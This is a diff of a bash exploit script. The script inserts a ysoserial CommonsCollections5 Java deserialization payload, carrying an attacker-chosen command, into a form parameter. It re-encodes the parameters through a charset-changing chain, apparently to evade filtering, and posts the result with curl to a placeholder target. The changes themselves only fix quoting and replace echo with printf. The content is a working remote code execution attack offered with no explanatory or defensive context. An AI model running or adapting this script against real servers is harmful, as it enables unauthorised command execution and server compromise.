@@ -36,12 +36,12 @@ function param_processor {
     data=""
     while IFS= read -r -d '&' param || [[ ! -z $param ]];do
         param_name=${param%%=*}
-        param_name_proc=$(echo "$param_name"|run_processors "${1}")
+        param_name_proc=$(printf %s "$param_name"|run_processors "${1}")
         [[ $param_name == "${param}" ]] && {
             data=$(printf '%s&%s' "${data}" "$param_name_proc")
         } || {
             param_val=${param#"${param_name}="}
-            param_val_proc=$(echo "$param_val"|run_processors "${1}")
+            param_val_proc=$(printf %s "$param_val"|run_processors "${1}")
             data=$(printf '%s&%s=%s' "${data}" "$param_name_proc" "$param_val_proc")
         }
     done
@@ -53,7 +53,7 @@ processors=(urldecode "enc '${charset^^}'" urlencode)
 params='param1=v%61l%201&state=%PAYLOAD%'
 
 payload=$(java -jar ysoserial.jar CommonsCollections5 "$1"|base64 -w0)
-params=${params/"%PAYLOAD%"/${payload}}
+params=${params/"%PAYLOAD%"/"${payload}"}
 params_processed=$(printf "%s" "${params}"|param_processor processors)
 
 curl -i -s -k -H "Content-Type: application/x-www-form-urlencoded; charset=${charset,,}" -d "$params_processed" 'https://vuln_site'
